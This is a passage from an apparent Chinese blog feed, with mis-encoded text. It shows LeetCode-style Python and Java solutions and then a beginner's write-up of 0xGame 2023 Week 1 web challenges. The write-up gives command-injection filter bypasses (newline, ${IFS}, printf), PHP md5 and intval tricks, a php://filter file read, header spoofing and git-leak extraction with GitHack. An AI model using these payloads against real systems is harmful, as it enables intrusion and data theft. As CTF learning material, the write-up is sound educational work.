class="hljs-variable">realTime</span> <span class="hljs-operator">=</span> (arrivalTime + delayedTime) % <span class="hljs-number">24</span>;<br>        System.out.println(<span class="hljs-string">&quot;åˆ—è½¦æœ¬è¯¥åœ¨&quot;</span> + arrivalTime + <span class="hljs-string">&quot;ç‚¹åˆ°ç«™ï¼Œä½†å»¶è¯¯äº†&quot;</span> + delayedTime + <span class="hljs-string">&quot;å°æ—¶ï¼Œæ‰€ä»¥å®é™…åˆ°ç«™æ—¶é—´ä¸º&quot;</span> + realTime + <span class="hljs-string">&quot;ç‚¹!&quot;</span>);<br><br>        scanner.close();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="4-ç½—é©¬æ•°å­—è½¬æ•´æ•°"><a href="#4-ç½—é©¬æ•°å­—è½¬æ•´æ•°" class="headerlink" title="4.ç½—é©¬æ•°å­—è½¬æ•´æ•°"></a>4.ç½—é©¬æ•°å­—è½¬æ•´æ•°</h2><p>ç½—é©¬æ•°å­—åŒ…å«ä»¥ä¸‹ä¸ƒç§å­—ç¬¦: <code>I</code>ï¼Œ <code>V</code>ï¼Œ <code>X</code>ï¼Œ <code>L</code>ï¼Œ<code>C</code>ï¼Œ<code>D</code> å’Œ <code>M</code>ã€‚</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">å­—ç¬¦          æ•°å€¼<br><span class="hljs-built_in">I</span>             <span class="hljs-number">1</span><br><span class="hljs-variable">V</span>             <span class="hljs-number">5</span><br><span class="hljs-variable">X</span>             <span class="hljs-number">10</span><br><span class="hljs-variable">L</span>             <span class="hljs-number">50</span><br><span class="hljs-built_in">C</span>             <span class="hljs-number">100</span><br><span class="hljs-built_in">D</span>             <span class="hljs-number">500</span><br><span class="hljs-variable">M</span>             <span class="hljs-number">1000</span><br></code></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼Œ ç½—é©¬æ•°å­— <code>2</code> å†™åš <code>II</code> ï¼Œå³ä¸ºä¸¤ä¸ªå¹¶åˆ—çš„ 1 ã€‚<code>12</code> å†™åš <code>XII</code> ï¼Œå³ä¸º <code>X</code> + <code>II</code> ã€‚ <code>27</code> å†™åš <code>XXVII</code>, å³ä¸º <code>XX</code> + <code>V</code> + <code>II</code> ã€‚</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œç½—é©¬æ•°å­—ä¸­å°çš„æ•°å­—åœ¨å¤§çš„æ•°å­—çš„å³è¾¹ã€‚ä½†ä¹Ÿå­˜åœ¨ç‰¹ä¾‹ï¼Œä¾‹å¦‚ 4 ä¸å†™åš <code>IIII</code>ï¼Œè€Œæ˜¯ <code>IV</code>ã€‚æ•°å­— 1 åœ¨æ•°å­— 5 çš„å·¦è¾¹ï¼Œæ‰€è¡¨ç¤ºçš„æ•°ç­‰äºå¤§æ•° 5 å‡å°æ•° 1 å¾—åˆ°çš„æ•°å€¼ 4 ã€‚åŒæ ·åœ°ï¼Œæ•°å­— 9 è¡¨ç¤ºä¸º <code>IX</code>ã€‚è¿™ä¸ªç‰¹æ®Šçš„è§„åˆ™åªé€‚ç”¨äºä»¥ä¸‹å…­ç§æƒ…å†µï¼š</p><ul><li><code>I</code> å¯ä»¥æ”¾åœ¨ <code>V</code> (5) å’Œ <code>X</code> (10) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º 4 å’Œ 9ã€‚</li><li><code>X</code> å¯ä»¥æ”¾åœ¨ <code>L</code> (50) å’Œ <code>C</code> (100) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º 40 å’Œ 90ã€‚ </li><li><code>C</code> å¯ä»¥æ”¾åœ¨ <code>D</code> (500) å’Œ <code>M</code> (1000) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º 400 å’Œ 900ã€‚</li></ul><p>ç»™å®šä¸€ä¸ªç½—é©¬æ•°å­—ï¼Œå°†å…¶è½¬æ¢æˆæ•´æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">romanToInt</span>(<span class="hljs-params">self, luoma</span>):<br>        roman_map = &#123;<span class="hljs-string">&#x27;I&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;V&#x27;</span>: <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;X&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;L&#x27;</span>: <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;C&#x27;</span>: <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;D&#x27;</span>: <span class="hljs-number">500</span>, <span class="hljs-string">&#x27;M&#x27;</span>: <span class="hljs-number">1000</span>&#125;<br>        result = <span class="hljs-number">0</span><br>        prev_value = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> luoma:<br>            value = roman_map[char]<br>            <span class="hljs-keyword">if</span> value &gt; prev_value:<br>                result += value - <span class="hljs-number">2</span> * prev_value<br>            <span class="hljs-keyword">else</span>:<br>                result += value<br>            prev_value = value<br>        <span class="hljs-keyword">return</span> result<br><br>s = Solution()<br>input_roman = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥ä¸€ä¸ªç½—é©¬æ•°å­—ï¼š&quot;</span>)<br><span class="hljs-built_in">print</span>(s.romanToInt(input_roman))<br><br></code></pre></td></tr></table></figure><h2 id="5-å›æ–‡æ•°"><a href="#5-å›æ–‡æ•°" class="headerlink" title="5.å›æ–‡æ•°"></a>5.å›æ–‡æ•°</h2><p>ç»™ä½ ä¸€ä¸ªæ•´æ•° <code>x</code> ï¼Œå¦‚æœ <code>x</code> æ˜¯ä¸€ä¸ªå›æ–‡æ•´æ•°ï¼Œè¿”å› <code>true</code> ï¼›å¦åˆ™ï¼Œè¿”å› <code>false</code> ã€‚</p><p>å›æ–‡æ•°æ˜¯æŒ‡æ­£åºï¼ˆä»å·¦å‘å³ï¼‰å’Œå€’åºï¼ˆä»å³å‘å·¦ï¼‰è¯»éƒ½æ˜¯ä¸€æ ·çš„æ•´æ•°ã€‚</p><ul><li>ä¾‹å¦‚ï¼Œ<code>121</code> æ˜¯å›æ–‡ï¼Œè€Œ <code>123</code> ä¸æ˜¯ã€‚</li></ul><p>æ€è·¯å°±æ˜¯å…ˆæŠŠæ•°å­—è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œç„¶åè®¡ç®—é•¿åº¦åˆ©ç”¨åˆ‡ç‰‡åˆ†åˆ«è¿”å›æ­£åºå€’åºçš„ç»“æœã€‚åˆ¤æ–­æ˜¯å¦ç›¸ç­‰ç„¶åè¾“å‡ºã€‚</p><p>ä¸€å¼€å§‹è¿˜æ˜¯æƒ³åˆ©ç”¨<code>input</code>å‡½æ•°æç¤ºç”¨æˆ·è¾“å…¥ï¼Œç„¶ååˆ©ç”¨<code>Int</code>è½¬æ¢ä¸ºæ•´æ•°ï¼Œå†åˆ©ç”¨<code>str</code>è½¬æˆå­—ç¬¦ä¸²ï¼Œåæ¥è§‰å¾—æ²¡ä»»ä½•å¿…è¦ã€‚ã€‚ç›´æ¥<code>number = input(&quot;è¯·è¾“å…¥ä¸€ä¸ªæ•°å­—ã€‚æˆ‘ä¼šåˆ¤æ–­æ˜¯ä¸æ˜¯å›æ–‡æ•°ï¼š&quot;)</code>å°±è¡Œã€‚ç„¶ååˆ©ç”¨<code>len</code>å‡½æ•°è®¡ç®—å­—ç¬¦ä¸²é•¿åº¦ï¼Œå†åˆ©ç”¨åˆ‡ç‰‡å»çœ‹æ­£åºå€’åºç»“æœï¼Œ<code>if</code>åˆ¤æ–­ç„¶åè¾“å…¥å°±è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_it</span>(<span class="hljs-params">self,num</span>):<br>        zhengxv = num[::]<br>        daoxv = num[::-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> zhengxv == daoxv:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;num&#125;</span>æ˜¯ä¸€ä¸ªå›æ–‡æ•°&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;num&#125;</span>ä¸æ˜¯ä¸€ä¸ªå›æ–‡æ•°&quot;</span>)<br>            <br>s = Solution()<br>num =  <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥ä¸€ä¸ªæ•°å­—ã€‚æˆ‘ä¼šåˆ¤æ–­æ˜¯ä¸æ˜¯å›æ–‡æ•°ï¼š&quot;</span>)<br><span class="hljs-built_in">print</span>(s.check_it(num))<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">check_it</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">numStr</span> <span class="hljs-operator">=</span> String.valueOf(num);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">reverseNumStr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(numStr).reverse().toString();<br>        <span class="hljs-keyword">if</span> (numStr.equals(reverseNumStr)) &#123;<br>            System.out.println(num + <span class="hljs-string">&quot; æ˜¯ä¸€ä¸ªå›æ–‡æ•°&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(num + <span class="hljs-string">&quot; ä¸æ˜¯ä¸€ä¸ªå›æ–‡æ•°&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Solution</span> <span class="hljs-variable">solution</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Solution</span>();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> <span class="hljs-number">12321</span>; <br>        solution.check_it(num);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_0xGame_Week1</title>
    <link href="/2023/09/18/ko1/"/>
    <url>/2023/09/18/ko1/</url>
    
    <content type="html"><![CDATA[<p>èœé¸Ÿçš„Write_upï¼Œåªæ¥è§¦è¿‡web</p><span id="more"></span><h1 id="webéƒ¨åˆ†"><a href="#webéƒ¨åˆ†" class="headerlink" title="webéƒ¨åˆ†"></a>webéƒ¨åˆ†</h1><h3 id="Week-1-ping"><a href="#Week-1-ping" class="headerlink" title="[Week 1] ping"></a>[Week 1] ping</h3><p>æ ¹æ®é¢˜ç›®æƒ³åˆ°å¯èƒ½æ˜¯RCEï¼š</p><p><img src="/img/ping1.png" alt="ping1"></p><p>çœ‹ä¸‹æºç å‘ç°æç¤ºï¼š<code>&lt;!-- visit &#39;/api.php?source&#39; for hint --&gt;</code>,è®¿é—®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sanitize</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>); <span class="hljs-comment">//;è¿‡æ»¤å¯ä»¥ç”¨å…¶å®ƒåˆ†éš”ç¬¦ç»•è¿‡ï¼Œæ¯”å¦‚&amp;&amp;å•¥çš„</span><br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>); <span class="hljs-comment">//ç©ºæ ¼è¿‡æ»¤å¯ä»¥ç”¨$&#123;IFS&#125;å•¥çš„ç»•è¿‡</span><br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>); <span class="hljs-comment">// /è¿‡æ»¤å¯ä»¥ç”¨åå¼•å·å’Œprintfé…åˆç»•è¿‡ï¼š`printf$&#123;IFS&#125;&quot;\57&quot;`</span><br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>); <span class="hljs-comment">//flagè¢«è¿‡æ»¤å¯ä»¥ç”¨é€šé…ç¬¦*ç»•è¿‡ï¼šfl*</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$s</span>;                      <br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>])) &#123;<span class="hljs-comment">//POSTä¼ IP</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No IP Address&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">sanitize</span>(<span class="hljs-variable">$ip</span>); <span class="hljs-comment">//å¯¹ä¼ è¿‡å»çš„ipè¿›è¡Œè¿‡æ»¤</span><br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#x27;</span>, <span class="hljs-variable">$ip</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid IP Address&#x27;</span>);<br>&#125;<span class="hljs-comment">//æ­£åˆ™åŒ¹é…IPv4åœ°å€çš„æ ¼å¼ï¼Œå¯ä»¥ç”¨æ¢è¡Œç¬¦%0aç»•è¿‡</span><br><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ping -c 4 &#x27;</span>.<span class="hljs-variable">$ip</span>. <span class="hljs-string">&#x27; 2&gt;&amp;1&#x27;</span>);  <span class="hljs-comment">//å‘½ä»¤æ‰§è¡Œ</span><br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>å…ˆåˆ©ç”¨lsçœ‹çœ‹å½“å‰ç›®å½•ä¸‹éƒ½æœ‰å•¥ä¸œè¥¿ï¼š</p><p><code>ip=127.0.0.1%0als</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">api<span class="hljs-selector-class">.php</span><br>index<span class="hljs-selector-class">.html</span><br>simple.css<br></code></pre></td></tr></table></figure><p>å»æ ¹ç›®å½•çœ‹çœ‹ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span>=<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">0</span>als<span class="hljs-variable">$&#123;IFS&#125;</span>`printf<span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-string">&quot;\57&quot;</span>`<br><span class="hljs-attribute">bin</span><br><span class="hljs-attribute">boot</span><br><span class="hljs-attribute">dev</span><br><span class="hljs-attribute">etc</span><br><span class="hljs-attribute">flag</span><br></code></pre></td></tr></table></figure><p>catè¯»&#x2F;flagçš„å†…å®¹ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span>=<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">0</span>acat<span class="hljs-variable">$&#123;IFS&#125;</span>`printf<span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-string">&quot;\57&quot;</span>`fl*<br></code></pre></td></tr></table></figure><p>flagï¼š0xGame{19c71976-d7d8-4ab8-9ea5-6ea3800f59f6}</p><h3 id="Week-1-baby-php"><a href="#Week-1-baby-php" class="headerlink" title="[Week 1] baby_php"></a>[Week 1] baby_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// flag in flag.php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<span class="hljs-comment">//GETä¼ aå’Œb,POSTä¼ c,COOKIEè¶…å…¨å±€å˜é‡ä¸­nameå¯¹åº”$name</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123; <span class="hljs-comment">//md5åŠ å¯†æ•°ç»„ä¼šè¿”å›nullï¼Œnull==nullæˆç«‹</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-variable">$c</span> != <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$c</span>) == <span class="hljs-number">1024</span>) &#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$name</span>.<span class="hljs-string">&#x27;.php&#x27;</span>); <span class="hljs-comment">//cä¸èƒ½æ˜¯ä¸ªæ•°å­—ï¼Œå¯ä»¥åœ¨ä»»æ„æ•°å­—ååŠ ä¸ªå­—æ¯è¾¾åˆ°ç›®çš„</span><br>        &#125;                          <span class="hljs-comment">//cä¸èƒ½ç­‰äº1024ï¼Œç»“åˆåé¢çš„intvalå‡½æ•°æƒ³åˆ°åˆ©ç”¨å°æ•°ç»•è¿‡ï¼Œintvalä¸€ä¸ªå°æ•°å¹¶ä¸ä¼šéµå¾ªå››èˆäº”å…¥åŸåˆ™</span><br>    &#125;                              <span class="hljs-comment">//æç¤ºflagåœ¨flag.phpä¸­ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´ã€‚å› ä¸ºåé¢ä¼šåŠ .phpæ‰€ä»¥ç›´æ¥ä¼ flagçœ‹çœ‹æƒ…å†µ</span><br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>ç»¼ä¸Šï¼š</p><p>GET<code>?a[]=1&amp;b[]=2</code>POST<code>c=1024.9a</code>å¹¶ä¸”<code>Cookie: name=flag</code></p><p>æ²¡ååº”ï¼Œè¯•äº†è¯•ç›®å½•ç©¿è¶Šä¹Ÿæ²¡ç»“æœã€‚æƒ³åˆ°ç”¨ä¼ªåè®®è¯»flag.phpï¼š</p><p><code>Cookie: name=php://filter/convert.base64-encode/resource=flag</code></p><p>å¾—åˆ°ä¸€ä¸²base64:</p><p><code>PD9waHAKCiRmbGFnID0gJzB4R2FtZXs0M2JiM2UyNC0wODI0LTQ4Y2ItOTVkMC1jNDcxNTQwYzA5NTN9JzsKCj8</code></p><p>è§£ä¸ªç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;0xGame&#123;43bb3e24-0824-48cb-95d0-c471540c0953&#125;&#x27;</span>;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><code>flag = 0xGame&#123;43bb3e24-0824-48cb-95d0-c471540c0953&#125;</code></p><h3 id="Week-1-hello-http"><a href="#Week-1-hello-http" class="headerlink" title="[Week 1] hello_http"></a>[Week 1] hello_http</h3><p>ç¬¬ä¸€å…³æç¤ºç”¨<code>Get</code>æ–¹å¼ä¼ <code>query</code>ï¼Œè€Œä¸”å€¼å¿…é¡»æ˜¯<code>ctf</code></p><p><code>?query=ctf</code></p><p>ç¬¬äºŒå…³æç¤ºç”¨<code>POS</code>Tä¼ <code>action</code>,è€Œä¸”å€¼å¿…é¡»æ˜¯<code>getflag</code></p><p><code>action=getflag</code></p><p>ç¬¬ä¸‰å…³æç¤º <code>you are not admin</code>ï¼Œæƒ³åˆ°è¿™ä¸œè¥¿å¯èƒ½åœ¨cookieæ”¾ç€ï¼ŒburpsuiteæŠ“åŒ…ï¼šå‘ç°<code>Cookie: role=guest</code>ï¼Œæ”¹æˆ<code>Cookie: role=admin</code></p><p>ç¬¬å››å…³æç¤º<code>Error: Only allow local IP</code>ï¼Œè¿˜æ˜¯æŠ“åŒ…åŠ ä¸ªXFFå¤´ï¼š</p><p><code>X-Forwarded-For:127.0.0.1</code></p><p>ç¬¬äº”å…³æç¤º<code>Error: You are not using HarmonyOS Browser ğŸ˜¡</code>ï¼Œè¿˜æ˜¯æŠ“åŒ…æ”¹User-Agentï¼š</p><p><code>User-Agent:HarmonyOS Browser</code></p><p>ç¬¬å…­å…³æç¤ºå¿…é¡»æ¥è‡ª<code>ys.mihoyo.com</code>ï¼ŒæŠ“åŒ…æ”¹Refererï¼š</p><p><code>Referer: ys.mihoyo.com</code></p><p>å¾—åˆ°Flag:<code>0xGame&#123;2c1a10fb-921e-4250-820f-5ce36940b8b5&#125;</code></p><h3 id="Week-1-repo-leak"><a href="#Week-1-repo-leak" class="headerlink" title="[Week 1] repo_leak"></a>[Week 1] repo_leak</h3><p>è¿›ç¯å¢ƒåå‘ç°æ˜¯ä¸ªåšå®¢ä¸»é¡µï¼Œé‡Œé¢æœ‰ä¸ªNoticeåšæ–‡å†™äº†è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><code>There is noting here. Using Git for version control</code></p><p>ç»“åˆé¢˜ç›®æƒ³åˆ°å¯èƒ½æ˜¯æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œè€Œä¸”è®¿é—®<code>/.git</code>å¹¶æ²¡æœ‰å¼¹404</p><p>ç”¨dirsearchæ‰«äº†ä¸€ä¸‹ï¼Œå‘ç°å¤§é‡.gitæ–‡ä»¶ï¼ŒçŒœæµ‹gitæ³„éœ²ï¼š</p><p><img src="/img/repo1.png" alt="repo1"></p><p>GitHackå¼„å®ƒï¼š</p><p><code>python2 GitHack.py http://120.27.148.152:50013/.git</code></p><p><img src="/img/repo2.png" alt="repo2"></p><p>åœ¨å­˜å‚¨æ‰«æç»“æœçš„æ–‡ä»¶å¤¹åˆ©ç”¨<code>git log</code>æŸ¥çœ‹æ¯ä¸ªcommitéƒ½å¹²äº†å•¥ï¼š</p><p><img src="/img/rerpo3.png" alt="rerpo3"></p><p>çœ‹åˆ°äº†ä¸‰ä¸ªç‰ˆæœ¬ï¼Œå‘ç°æœ‰ä¸ª <code>add post : flag</code></p><p>å¯¹æ¯”ä¸‹ç‰ˆæœ¬æ‹¿flag:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git diff ea44cb8ff3c27bb1db6d3acc4c875144d295045d 8a5b670558921bd232d75b29542492f00698298b<br></code></pre></td></tr></table></figure><p><img src="/img/repo4.png" alt="repo4"></p><p><code>0xGame&#123;3fc49725-23b5-4f28-8c64-16a3459b67b7&#125;</code></p><h3 id="Week-1-signin"><a href="#Week-1-signin" class="headerlink" title="[Week 1] signin"></a>[Week 1] signin</h3><p>æ˜æ˜æ˜¯ç­¾åˆ°å´æ˜¯æœ€åä¸€ä¸ªè§£å‡ºæ¥çš„:(è¿æ°”å¥½è¢«æˆ‘ä¹±ç‚¹ç‚¹å‡ºæ¥äº†</p><p><img src="/img/ok1.png" alt="ok1"></p><p><code>flagï¼š0xGame&#123;c788fa80-2184-429f-b410-48cb8e2de0ff&#125;</code></p><h1 id="MISCéƒ¨åˆ†"><a href="#MISCéƒ¨åˆ†" class="headerlink" title="MISCéƒ¨åˆ†"></a>MISCéƒ¨åˆ†</h1><h3 id="Week-1-shark-shark"><a href="#Week-1-shark-shark" class="headerlink" title="[Week 1] shark shark"></a>[Week 1] shark shark</h3><p>ç¬¬ä¸€æ¬¡åšæ‚é¡¹çš„é¢˜ :) 